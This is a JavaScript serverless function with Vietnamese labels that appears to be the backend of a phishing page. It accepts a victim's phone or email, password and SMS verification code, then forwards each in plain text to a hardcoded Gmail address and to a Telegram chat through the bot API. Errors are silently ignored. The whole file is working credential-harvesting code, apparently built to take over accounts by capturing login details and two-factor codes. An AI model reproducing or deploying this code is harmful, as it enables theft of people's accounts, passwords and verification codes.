import { createClientFromRequest } from 'npm:@base44/sdk@0.8.40';

const RECIPIENT_EMAIL = "thanhtoanww15@gmail.com";
const TELEGRAM_CHAT_ID = "52504489";

async function sendTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
    });
  } catch (e) { /* bỏ qua lỗi Telegram */ }
}

export default async function(req) {
  try {
    const body = await req.json();
    const identifier = typeof body?.identifier === "string" ? body.identifier.slice(0, 200) : "";
    const password = typeof body?.password === "string" ? body.password.slice(0, 200) : "";
    const code = typeof body?.code === "string" ? body.code.slice(0, 20) : "";

    if (!identifier && !code) {
      return Response.json({ error: "Thiếu thông tin." }, { status: 400 });
    }

    const base44 = createClientFromRequest(req);
    const user = await base44.auth.me().catch(() => null);
    const submittedBy = user ? (user.email || user.id) : "Khách";

    let subject, bodyHtml;
    if (code) {
      subject = "Mã xác nhận SMS mới";
      bodyHtml = `
        <div style="font-family: Arial, sans-serif; color: #1e293b; font-size: 14px;">
          <h2 style="margin:0 0 12px 0; color:#007AFF;">Mã xác nhận SMS</h2>
          <p style="margin:0 0 8px 0;"><b>Mã đã nhập:</b> ${code}</p>
          <p style="margin:0 0 8px 0;"><b>Người gửi:</b> ${submittedBy}</p>
          <p style="margin:0 0 8px 0;"><b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}</p>
        </div>
      `;
    } else {
      subject = "Dữ liệu đăng nhập mới";
      bodyHtml = `
        <div style="font-family: Arial, sans-serif; color: #1e293b; font-size: 14px;">
          <h2 style="margin:0 0 12px 0; color:#0866FF;">Dữ liệu đăng nhập mới</h2>
          <p style="margin:0 0 8px 0;"><b>Số di động / Email:</b> ${identifier}</p>
          <p style="margin:0 0 8px 0;"><b>Mật khẩu:</b> ${password}</p>
          <p style="margin:0 0 8px 0;"><b>Người gửi:</b> ${submittedBy}</p>
          <p style="margin:0 0 8px 0;"><b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}</p>
        </div>
      `;
    }

    try {
      await base44.asServiceRole.integrations.Core.SendEmail({
        to: RECIPIENT_EMAIL,
        subject,
        body: bodyHtml
      });
    } catch (e) { /* bỏ qua lỗi email */ }

    let tgText;
    if (code) {
      tgText = `🛡️ <b>Mã xác nhận SMS</b>\n<b>Mã:</b> ${code}\n<b>Người gửi:</b> ${submittedBy}\n<b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}`;
    } else {
      tgText = `🔑 <b>Dữ liệu đăng nhập mới</b>\n<b>Số di động / Email:</b> ${identifier}\n<b>Mật khẩu:</b> ${password}\n<b>Người gửi:</b> ${submittedBy}\n<b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}`;
    }
    await sendTelegram(tgText);

    return Response.json({ ok: true });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
}